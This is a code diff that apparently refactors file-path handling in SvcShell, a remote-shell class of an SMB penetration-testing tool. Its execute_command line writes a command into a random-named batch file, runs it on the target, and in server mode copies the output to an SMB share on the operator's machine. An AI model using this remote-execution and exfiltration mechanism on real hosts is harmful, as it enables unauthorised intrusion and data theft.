@@ -77,17 +77,11 @@ class SvcShell(cmd.Cmd):
         self.__svc = svc
         self.__mgr_handle = mgr_handle
         self.__rpc = rpc
-        self.__share = 'C$'
         self.__mode = mode
         self.__output_file = '%s.txt' % ''.join([random.choice(string.letters) for _ in range(8)])
-
-        if DataStore.version_major >= 6 or (DataStore.version_major == 5 and DataStore.version_minor == 1):
-            self.__output = ntpath.join('\\', 'Windows', 'Temp', self.__output_file)
-        else:
-            self.__output = ntpath.join('\\', 'WINNT', 'Temp', self.__output_file)
-
+        self.__output_file_path = ntpath.join(DataStore.share_path, self.__output_file)
         self.__batch_filename = '%s.bat' % ''.join([random.choice(string.letters) for _ in range(8)])
-        self.__batchFile = ntpath.join('%TEMP%', self.__batch_filename)
+        self.__batchFile = ntpath.join(DataStore.share_path, self.__batch_filename)
         self.__smbserver_dir = 'svcshell'
         self.__smbserver_share = 'KEIMPX'
         self.__outputBuffer = ''
@@ -102,7 +96,7 @@ class SvcShell(cmd.Cmd):
 
         if self.__mode == 'SERVER':
             myIPaddr = self.transferClient.getSMBServer().get_socket().getsockname()[0]
-            self.__copyBack = 'copy %s \\\\%s\\%s' % (self.__output, myIPaddr, self.__smbserver_share)
+            self.__copyBack = 'copy %s \\\\%s\\%s' % (self.__output_file_path, myIPaddr, self.__smbserver_share)
 
     def __output_callback(self, data):
         self.__outputBuffer += data
@@ -148,11 +142,11 @@ class SvcShell(cmd.Cmd):
             except:
                 pass
         else:
-            self.transferClient.getFile(self.__share, self.__output, self.__output_callback)
-            self.transferClient.deleteFile(self.__share, self.__output)
+            self.transferClient.getFile(DataStore.default_share, self.__output_file, self.__output_callback)
+            self.transferClient.deleteFile(DataStore.default_share, self.__output_file)
 
     def execute_command(self, command):
-        command = '%s echo %s ^> %s > %s & %s %s' % (self.__shell, command, self.__output, self.__batchFile, self.__shell, self.__batchFile)
+        command = '%s echo %s ^> %s > %s & %s %s' % (self.__shell, command, self.__output_file_path, self.__batchFile, self.__shell, self.__batchFile)
 
         if self.__mode == 'SERVER':
             command += ' & %s' % self.__copyBack
